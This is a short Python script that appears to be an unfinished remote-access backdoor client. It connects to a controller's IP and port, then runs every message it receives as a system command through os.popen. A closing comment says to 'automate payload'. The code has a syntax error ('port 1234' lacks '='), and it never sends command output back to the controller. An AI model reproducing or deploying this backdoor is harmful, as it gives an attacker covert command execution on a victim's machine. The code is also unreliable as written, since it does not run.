import socket
import os

server = socket.socket()
#server ip
host = '127.0.0.1' 
#port youre tunneling data into
port 1234
run = True
server.connect((host, port))
while run:
	msg = server.recv(1024)
	os.popen(msg.decode('UTF-8')) #allows us to run commands in cmd
	server.send('Client Online.'.encode('UTF-8'))
#!!!!write a script to automate payload